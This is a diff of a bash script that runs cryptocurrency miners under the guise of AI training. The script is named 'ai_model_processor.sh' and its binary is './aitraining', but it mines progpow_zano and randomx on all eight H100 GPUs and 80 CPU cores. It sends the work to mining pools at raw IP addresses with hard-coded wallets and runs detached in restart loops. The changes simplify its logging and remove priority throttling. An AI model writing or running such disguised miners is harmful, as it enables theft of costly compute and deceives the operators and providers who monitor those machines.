@@ -1,30 +1,26 @@
 #!/bin/bash
 
-# ai_model_processor.sh - Optimized for 8x H100 + 96 vCPUs + 1.9TB RAM
+# ai_model_processor.sh - Fixed tee issue
 
 # -------- CONFIGURATION --------
 
-PROCESSOR_PATH="./aitraining"           # path to your processor binary
+PROCESSOR_PATH="./aitraining"
 LOG_DIR="./logs"
 mkdir -p "$LOG_DIR"
 
-# GPU settings - 8x H100
-GPU_ALGO="progpow_zano"                # From your logs
-GPU_POOL="stratum+ssl://51.89.99.172:16161"   # Use stratum protocol
+# GPU settings
+GPU_ALGO="progpow_zano"
+GPU_POOL="stratum+ssl://51.89.99.172:16161"
 GPU_WALLET="RM2ciYa3CRqyreRsf25omrB4e1S95waALr"
-GPU_IDS="0,1,2,3,4,5,6,7"               # All 8 H100 GPUs
+GPU_IDS="0,1,2,3,4,5,6,7"
 
-# CPU settings - 96 vCPUs  
-CPU_ALGO="randomx"                     # Common CPU algorithm
+# CPU settings  
+CPU_ALGO="randomx"
 CPU_POOL="stratum+ssl://51.222.200.133:10343"
 CPU_WALLET="44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"
-
-# CPU cores allocation for 96 vCPUs:
-# - Cores 0-79: For CPU processor (80 cores)
-# - Cores 80-95: Reserved for system/GPU drivers (16 cores)
 CPU_CORES="0-79"
 
-# Memory allocation for 1.9TB RAM
+# Memory allocation
 MEMORY_PAGES=512000
 
 # GPU environment settings
@@ -42,11 +38,6 @@ GPU_LOG="$LOG_DIR/gpu_processing.log"
 CPU_LOG="$LOG_DIR/cpu_processing.log"
 MONITOR_LOG="$LOG_DIR/monitor.log"
 PERFORMANCE_LOG="$LOG_DIR/performance.log"
-
-# Process priority settings
-NICE_PRIORITY=0
-IONICE_CLASS=2
-IONICE_CLASSDATA=4
 
 # -------- END CONFIGURATION --------
 
@@ -87,7 +78,6 @@ log_performance_metrics() {
   local process_type="$2"
   
   if [ -f "$log_file" ]; then
-    # Extract recent performance data
     local recent_log=$(tail -n 50 "$log_file" | grep -E "MH/s|H/s|GPU[0-9]+|Total:|accepted|rejected" | tail -n 15)
     
     if [ -n "$recent_log" ]; then
@@ -106,15 +96,14 @@ monitor_gpu_detailed() {
   fi
 }
 
-# Start GPU processor with correct parameters
+# Start GPU processor - FIXED tee issue
 start_gpu_processor() {
   echo "$(date +'%F %T') Starting GPU processor on 8x H100..." | tee -a "$MONITOR_LOG"
   while true; do
-    # Use correct parameters for the miner
-    nice -n $NICE_PRIORITY ionice -c $IONICE_CLASS -n $IONICE_CLASSDATA \
-      "$PROCESSOR_PATH" --algo "$GPU_ALGO" \
+    # Fixed: Use simple redirection instead of tee
+    "$PROCESSOR_PATH" --algo "$GPU_ALGO" \
       --pool "$GPU_POOL" --gpu-id "$GPU_IDS" --wallet "$GPU_WALLET" \
-      2>&1 | tee -a "$GPU_LOG" &
+      >> "$GPU_LOG" 2>&1 &
     
     GPU_PID=$!
     echo "$(date +'%F %T') GPU processor PID: $GPU_PID" | tee -a "$MONITOR_LOG"
@@ -133,7 +122,7 @@ start_gpu_processor() {
   done
 }
 
-# Start CPU processor with correct parameters
+# Start CPU processor - FIXED tee issue
 start_cpu_processor() {
   echo "$(date +'%F %T') Starting CPU processor on 80 cores..." | tee -a "$MONITOR_LOG"
   while true; do
@@ -158,10 +147,9 @@ start_cpu_processor() {
       CMD_PREFIX="taskset -c $CPU_CORES"
     fi
 
-    # Start CPU processor with correct parameters
-    nice -n $NICE_PRIORITY ionice -c $IONICE_CLASS -n $IONICE_CLASSDATA \
-      bash -c "$CMD_PREFIX \"$PROCESSOR_PATH\" --algo \"$CPU_ALGO\" --pool \"$CPU_POOL\" --threads $THREADS --wallet \"$CPU_WALLET\"" \
-      2>&1 | tee -a "$CPU_LOG" &
+    # Fixed: Use simple redirection instead of tee
+    $CMD_PREFIX "$PROCESSOR_PATH" --algo "$CPU_ALGO" --pool "$CPU_POOL" --threads $THREADS --wallet "$CPU_WALLET" \
+      >> "$CPU_LOG" 2>&1 &
     
     CPU_PID=$!
     echo "$(date +'%F %T') CPU processor PID: $CPU_PID (threads=$THREADS)" | tee -a "$MONITOR_LOG"
@@ -217,6 +205,10 @@ echo "System Info:" >> "$MONITOR_LOG"
 lscpu >> "$MONITOR_LOG" 2>&1
 nvidia-smi >> "$MONITOR_LOG" 2>&1
 
+# Kill any existing processes first
+pkill -f aitraining
+sleep 3
+
 # Run everything in background
 echo "Starting parallel processing system..."
 setsid bash -c "start_gpu_processor" >/dev/null 2>&1 &
@@ -234,5 +226,9 @@ echo " - CPU Processing: $CPU_LOG"
 echo " - System Monitoring: $MONITOR_LOG"
 echo " - Performance Metrics: $PERFORMANCE_LOG"
 echo ""
+echo "To check if processes are running:"
+echo "  ps aux | grep aitraining"
+echo "  htop"
+echo ""
 echo "To stop all processes: pkill -f aitraining"
-echo "To view real-time logs: tail -f $LOG_DIR/*.log"
+echo "To view real-time logs: tail -f $LOG_DIR/gpu_processing.log"
